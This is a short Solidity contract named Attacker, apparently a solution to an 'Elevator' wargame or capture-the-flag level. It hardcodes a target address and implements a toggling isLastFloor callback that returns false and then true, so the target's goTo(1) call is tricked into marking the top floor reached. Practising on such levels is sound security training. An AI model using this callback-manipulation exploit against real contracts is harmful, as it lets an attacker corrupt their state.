// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IElevator {
    function goTo(uint256 _floor) external;
    function top() external view returns (bool);
}


contract Attacker{
    address constant private TARGET_ADDRESS = 0xda9A7754817317Ca8D1fd1d6A6F496Bd919b8C24;
    IElevator target = IElevator(TARGET_ADDRESS);
    bool public toggle = false; 
    
    function isLastFloor(uint256 _floor) public returns (bool){
        toggle = !toggle;
        return !toggle;
    }    

    function attack() public {
        target.goTo(1);
    }

}